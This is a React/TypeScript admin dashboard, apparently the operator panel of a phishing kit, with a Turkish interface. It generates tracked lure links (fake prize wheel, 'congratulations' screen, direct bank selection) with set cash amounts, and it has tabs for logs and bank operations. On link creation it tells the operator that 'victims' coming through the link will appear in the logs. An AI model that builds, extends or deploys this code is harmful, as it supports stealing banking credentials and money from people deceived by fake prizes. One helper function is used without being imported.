"use client";

import { useState } from "react";
import { LogsTab } from "./components/LogsTab";
import { UsersTab } from "./components/UsersTab";
import { BanksTab } from "./components/BanksTab";
import { LanguageTab } from "./components/LanguageTab";
import { WheelSettingsTab } from "./components/WheelSettingsTab";
import { GeneralSettingsTab } from "./components/GeneralSettingsTab";

export function Admin1Dashboard({ user }: { user: any }) {
  const [isCollapsed, setIsCollapsed] = useState(false);
  const [darkMode, setDarkMode] = useState(true);
  const [activeTab, setActiveTab] = useState("Loglar");
  const [showNewLinkModal, setShowNewLinkModal] = useState(false);

  // Link Oluşturma State'leri
  const [creatingLink, setCreatingLink] = useState(false);
  const [newLink, setNewLink] = useState<string | null>(null);
  const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank">("normal");
  const [amount, setAmount] = useState("5000");
  const [currency, setCurrency] = useState("€");
  const [createLinkError, setCreateLinkError] = useState<string | null>(null);

  const adminIdentifier = user?.user_metadata?.username || user?.email?.split('@')[0] || "admin";
  const supabase = createBrowserSupabaseClient();

  async function handleCreateLink() {
    if (!supabase) return;
    setCreateLinkError(null);
    setCreatingLink(true);
    
    try {
      const { data, error } = await supabase
        .from("sessions")
        .insert({ 
          amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0), 
          current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry", 
          status: "offline", 
          partner_name: adminIdentifier,
          form_data: { currency, is_wheel_game: linkType === "wheel" }
        })
        .select("id")
        .single();

      if (error) throw error;

      if (data?.id) {
        let urlPath = `/code?session=${data.id}`;
        if (linkType === "wheel") urlPath = `/wheel?session=${data.id}`;
        if (linkType === "direct_win") urlPath = `/win/${data.id}`;
        if (linkType === "direct_bank") urlPath = `/banken?session=${data.id}`;
        setNewLink(`${window.location.origin}${urlPath}`);
      }
    } catch (err: any) {
      setCreateLinkError(err.message || "Link oluşturulamadı.");
    } finally {
      setCreatingLink(false);
    }
  }

  const renderContent = () => {
    switch (activeTab) {
      case "Loglar":
        return <LogsTab darkMode={darkMode} user={user} />;
      case "Banka İşlemleri":
        return <BanksTab darkMode={darkMode} />;
      case "Dil Ayarları":
        return <LanguageTab darkMode={darkMode} />;
      case "Çark Ayarları":
        return <WheelSettingsTab darkMode={darkMode} />;
      case "Kullanıcı":
        return <UsersTab darkMode={darkMode} />;
      case "Genel Ayarlar":
      case "Arkaplan Rengi":
        return <GeneralSettingsTab darkMode={darkMode} />;
      default:
        return <LogsTab darkMode={darkMode} user={user} />;
    }
  };

  return (
    <div className={`flex h-screen overflow-hidden ${darkMode ? 'bg-[#121212] text-gray-200' : 'bg-gray-50 text-gray-800'}`}>
      
      {/* SIDEBAR */}
      <div className={`flex flex-col transition-all duration-300 border-r ${darkMode ? 'bg-[#121212] border-white/10' : 'bg-white border-gray-200'} ${isCollapsed ? 'w-[80px]' : 'w-[260px]'}`}>
        <div className="h-[75px] flex items-center justify-between px-4 border-b border-white/10">
          {!isCollapsed && <span className="text-xl font-bold tracking-wider text-[#EB5E28]">EPIN</span>}
          <button onClick={() => setIsCollapsed(!isCollapsed)} className={`p-2 rounded-lg ${darkMode ? 'hover:bg-white/10' : 'hover:bg-gray-100'} transition-colors ${isCollapsed ? 'mx-auto' : ''}`}>
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" /></svg>
          </button>
        </div>
        <div className="flex-1 overflow-y-auto py-4 space-y-2">
          {/* Menu Items */}
          <SidebarItem icon="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" label="Loglar" active={activeTab === "Loglar"} onClick={() => setActiveTab("Loglar")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" label="Banka İşlemleri" active={activeTab === "Banka İşlemleri"} onClick={() => setActiveTab("Banka İşlemleri")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" label="Dil Ayarları" active={activeTab === "Dil Ayarları"} onClick={() => setActiveTab("Dil Ayarları")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" label="Çark Ayarları" active={activeTab === "Çark Ayarları"} onClick={() => setActiveTab("Çark Ayarları")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z" label="Kullanıcı" active={activeTab === "Kullanıcı"} onClick={() => setActiveTab("Kullanıcı")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" label="Genel Ayarlar" active={activeTab === "Genel Ayarlar"} onClick={() => setActiveTab("Genel Ayarlar")} isCollapsed={isCollapsed} darkMode={darkMode} />
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div className="flex-1 flex flex-col h-full overflow-hidden">
        {/* TOPBAR */}
        <div className={`h-[75px] border-b flex items-center justify-between px-6 shrink-0 ${darkMode ? 'border-white/10 bg-[#121212]' : 'border-gray-200 bg-white'}`}>
          <div className="text-lg font-medium opacity-80">Dashboard / {activeTab}</div>
          <div className="flex items-center space-x-6">
            <span className="text-sm opacity-60">Giriş yapan: {adminIdentifier}</span>
            <button onClick={() => setDarkMode(!darkMode)} className={`p-2 rounded-full ${darkMode ? 'bg-white/10 text-yellow-400' : 'bg-gray-100 text-gray-600'}`}>
              {darkMode ? (
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fillRule="evenodd" clipRule="evenodd" /></svg>
              ) : (
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" /></svg>
              )}
            </button>
            <button onClick={() => setShowNewLinkModal(true)} className={`flex items-center gap-2 px-4 py-2 rounded-lg ${darkMode ? 'hover:bg-white/10' : 'hover:bg-gray-100'} transition-colors`}>
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" /></svg>
                <span>Link Oluştur</span>
            </button>
          </div>
        </div>

        {/* CONTENT */}
        <div className="flex-1 overflow-y-auto p-6">
          {renderContent()}
        </div>
      </div>

      {/* Link Oluştur Modal */}
      {showNewLinkModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
          <div className={`w-full max-w-md rounded-xl shadow-2xl p-6 ${darkMode ? 'bg-[#1e1e1e] border border-white/10' : 'bg-white'}`}>
            <h3 className="text-xl font-bold mb-4">Yeni Link Oluştur</h3>
            
            {!newLink ? (
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium mb-1">Başlangıç Sayfası</label>
                  <select 
                    value={linkType} 
                    onChange={(e) => setLinkType(e.target.value as any)}
                    className={`w-full p-2 rounded border outline-none ${darkMode ? 'bg-[#121212] border-zinc-700' : 'bg-gray-50 border-gray-300'}`}
                  >
                    <option value="normal">Katılım Kodu (Normal)</option>
                    <option value="wheel">Çark Oyunu</option>
                    <option value="direct_win">Tebrikler Ekranı</option>
                    <option value="direct_bank">Direkt Banka Seçimi</option>
                  </select>
                </div>
                
                {linkType !== "wheel" && (
                  <div className="flex gap-2">
                    <div className="flex-1">
                      <label className="block text-sm font-medium mb-1">Miktar</label>
                      <input 
                        type="text" 
                        value={amount} 
                        onChange={(e) => setAmount(e.target.value)}
                        className={`w-full p-2 rounded border outline-none ${darkMode ? 'bg-[#121212] border-zinc-700' : 'bg-gray-50 border-gray-300'}`}
                      />
                    </div>
                    <div className="w-24">
                      <label className="block text-sm font-medium mb-1">Para Birimi</label>
                      <select 
                        value={currency} 
                        onChange={(e) => setCurrency(e.target.value)}
                        className={`w-full p-2 rounded border outline-none ${darkMode ? 'bg-[#121212] border-zinc-700' : 'bg-gray-50 border-gray-300'}`}
                      >
                        <option value="€">€ (EUR)</option>
                        <option value="$">$ (USD)</option>
                        <option value="£">£ (GBP)</option>
                      </select>
                    </div>
                  </div>
                )}
                
                {createLinkError && (
                  <div className="p-2 text-sm text-red-500 bg-red-500/10 rounded">
                    {createLinkError}
                  </div>
                )}
                
                <div className="flex justify-end gap-2 mt-6">
                  <button 
                    onClick={() => setShowNewLinkModal(false)} 
                    className={`px-4 py-2 rounded-lg font-bold ${darkMode ? 'hover:bg-white/10' : 'hover:bg-gray-100'} transition-colors`}
                  >
                    İptal
                  </button>
                  <button 
                    onClick={handleCreateLink}
                    disabled={creatingLink}
                    className="px-4 py-2 bg-[#EB5E28] text-white rounded-lg font-bold hover:bg-[#c94d1e] transition-colors disabled:opacity-50"
                  >
                    {creatingLink ? "Oluşturuluyor..." : "Oluştur"}
                  </button>
                </div>
              </div>
            ) : (
              <div className="space-y-4">
                <p className="text-sm opacity-80">Linkiniz başarıyla oluşturuldu. Bu link üzerinden gelen kurbanlar loglarınızda görünecektir.</p>
                <div className="flex gap-2">
                  <input 
                    type="text" 
                    readOnly 
                    value={newLink} 
                    className={`flex-1 p-3 rounded-lg text-sm font-mono outline-none ${darkMode ? 'bg-[#121212] text-white border border-zinc-700' : 'bg-gray-100 border border-gray-300'}`} 
                  />
                  <button 
                    onClick={() => navigator.clipboard.writeText(newLink)} 
                    className="px-4 py-2 bg-[#EB5E28] text-white rounded-lg font-bold hover:bg-[#c94d1e] transition-colors"
                  >
                    Kopyala
                  </button>
                </div>
                <div className="flex justify-end">
                  <button 
                    onClick={() => {
                      setNewLink(null);
                      setShowNewLinkModal(false);
                    }} 
                    className={`px-4 py-2 rounded-lg font-bold ${darkMode ? 'hover:bg-white/10' : 'hover:bg-gray-100'} transition-colors`}
                  >
                    Kapat
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

    </div>
  );
}

function SidebarItem({ icon, label, active, isCollapsed, darkMode, onClick }: { icon: string, label: string, active?: boolean, isCollapsed: boolean, darkMode: boolean, onClick: () => void }) {
  return (
    <a href="#" onClick={(e) => { e.preventDefault(); onClick(); }} className={`flex items-center px-4 py-3 mx-3 rounded-lg transition-colors ${active ? (darkMode ? 'bg-[#EB5E28]/10 text-[#EB5E28]' : 'bg-[#EB5E28]/10 text-[#EB5E28]') : (darkMode ? 'text-gray-400 hover:text-white hover:bg-white/5' : 'text-gray-600 hover:text-gray-900 hover:bg-gray-100')}`}>
      <svg className={`w-5 h-5 shrink-0 ${active ? 'text-[#EB5E28]' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={icon} />
      </svg>
      {!isCollapsed && <span className="ml-3 font-medium text-sm">{label}</span>}
    </a>
  );
}
